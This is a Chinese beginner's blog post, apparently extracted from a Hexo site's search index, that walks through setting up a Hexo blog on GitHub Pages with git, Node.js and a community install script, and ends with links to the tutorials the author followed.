href="#注：此文章是在看大佬的搭建法后的总结和自己写博客的尝试，想搭博客的小伙伴可以直接看文末链接。" class="headerlink" title="注：此文章是在看大佬的搭建法后的总结和自己写博客的尝试，想搭博客的小伙伴可以直接看文末链接。"></a>注：此文章是在看大佬的搭建法后的总结和自己写博客的尝试，想搭博客的小伙伴可以直接看文末链接。</h2><h2 id="我将我遇到问题后发现的注意点写了下来，以供参考。"><a href="#我将我遇到问题后发现的注意点写了下来，以供参考。" class="headerlink" title="我将我遇到问题后发现的注意点写了下来，以供参考。"></a>我将我遇到问题后发现的注意点写了下来，以供参考。</h2><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li>下载git  </li></ul><p>百度官网下载git，这是个方方面面都用的到的工具   </p><ul><li>网上注册github账号  </li></ul><p>想部署到远端必须有这个，注意用户名写全小写英文的，可以有数字，但不要有中文和大写英文，免得造成不必要的麻烦。 </p><p>创建的数据库最好是用户名.github.io的格式，理由同上，其中.github.io的后缀必须要有。  </p><ul><li>下载nodejs  </li></ul><p>同样官网下载，下载方法自行百度，请仔细阅读下载流程，一定记得选Add。（具体网上有)   </p><ul><li>配置node环境变量  </li></ul><p>打开下载好的nodejs文件夹，新建node_cecal和node_global。  </p><p>我的文件地址是D:\Program Files\nodejs，具体看自己下载情况  </p><p>右击此电脑，选择属性，高级系统设置，环境变量<br>在用户变量PATH新建D:\Program Files\nodejs\node_global\ 具体位置看自己安装位置<br>在系统变量中新建变量名NODE_PATH 变量位置D:\Program Files\nodejs\node_modules 位置依旧是自己安装的位置，这里写出的是我的安装位置。  </p><p>接着打开终端，指定路径到新建的两个文件夹npm config set prefix”D:\Program Files\nodejs\node_global”<br>和npm config cache”D:\Program Files\nodejs\node_cache”这里引号里的位置是自己的，别全抄我的。  </p><p>最后检查node和git的安装情况，一般git不会出问题，所以可以忽略。<br>使用 source install.sh test_git检查git<br>使用 source install.sh test_node检查node（这里其实不用这么麻烦，输node -v就可以，install.sh是装了脚本的命令）<br>最后检查一下npm用npm -v ，这是我自己的经验<br>以上均出现版本号是正常  </p><p>到这里，准备工作完成  </p><h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2><ul><li>这里正常思路是直接手搭，但这方法对许多小白来说太不友好，所以这里推荐大佬的脚本搭建。  </li></ul><p>复制 （curl -O <a href="https://cdn.jsdelivr.net/gh/kjhuanhao/hexo-script@master/install.sh%EF%BC%89">https://cdn.jsdelivr.net/gh/kjhuanhao/hexo-script@master/install.sh）</a><br>【括号里都要】 任选一个文件夹使用git下载脚本即可，记住下载位置（脚本搭建这是第一步）。<br>注：手搭以后会写，这篇只分享友好小白的脚本搭建  </p><p>打开保存了脚本的文件夹，用git输入source install.sh hexo_win这样该有的基本就一键搭齐了。<br>接下来从自动配置的hexoblog文件夹打开git，用hexo s就可以查看博客了。  </p><ul><li>部署进github数据库<br>在存放脚本的目录用git输入  ./install.sh git_ssh开始配置密钥，英语不好的小伙伴建议全程百度翻译，不然就准备走我的老路吧（看不懂英语没密钥没部署就过了）  </li></ul><p>在进行第二个选项得到密钥后，打开你的github，将密钥添加上去（注意格式，全复制最ok）<br>运行3检查无误，运行4可能会告诉你公钥有问题什么的，不用管。  </p><p>确认部署完成后，在有脚本的文件夹中运行source install.sh deploy<br>将出现的up.sh复制进hexoblog目录下  </p><p>打开博客目录下的_config.yml文件，无法打开去网上下编译工具，随便一个都行。<br>拉至最下方，修改deploy内容，这里大佬的文章中写的很清楚，我不再赘述<br>然后在此目录下运行source up.sh 如果报错，运行cnpm install hexo-deployer-git –save或者是npm install hexo-deployer-git –save  </p><p>到这里，博客就搭建完成了，当然为了保险起见，在hexoblog目录打开git<br>依次输入hexo clean     hexo g    hexo d 最后hexo s查看  </p><h2 id="教我搭建的大佬搭建教程链接-amp-主题配置链接"><a href="#教我搭建的大佬搭建教程链接-amp-主题配置链接" class="headerlink" title="教我搭建的大佬搭建教程链接&amp;主题配置链接"></a>教我搭建的大佬搭建教程链接&amp;主题配置链接</h2><ul><li>b站<a href="https://space.bilibili.com/431556388?spm_id_from=333.788.b_765f7570696e666f.1">https://space.bilibili.com/431556388?spm_id_from=333.788.b_765f7570696e666f.1</a><br>（我是看他的视频开始搭建的，准备工作讲的很细，后面水了）  </li><li>脚本搭建<a href="https://hexoscript.gitbook.io/hexo-script/v/1.3-1/shi-yong-bu-zhou/yi-jian-bu-shu-hexo-bo-ke">https://hexoscript.gitbook.io/hexo-script/v/1.3-1/shi-yong-bu-zhou/yi-jian-bu-shu-hexo-bo-ke</a><br>从下载脚本到搭建完成我都是靠这篇  </li><li>主题修改<br><a href="https://blog.csdn.net/victoryxa/article/details/105841309">https://blog.csdn.net/victoryxa/article/details/105841309</a>  <a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md#%E4%BF%AE%E6%94%B9%E4%B8%BB%E9%A2%98%E9%A2%9C%E8%89%B2">https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md#%E4%BF%AE%E6%94%B9%E4%B8%BB%E9%A2%98%E9%A2%9C%E8%89%B2</a><br>【主题按b站视频中方式搭建即可，用其他的也没问题，百度方法很多，我只是做个汇总】<br>【文章中和链接中不同部分是我经验之谈，当然每个人的搭建过程都有区别，参考即可】<br>【新手上路，此篇无图】<br>【以后会有的】<br> 注：hexo可能会出现插入文件失败的问题，需用]]></content>
      
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
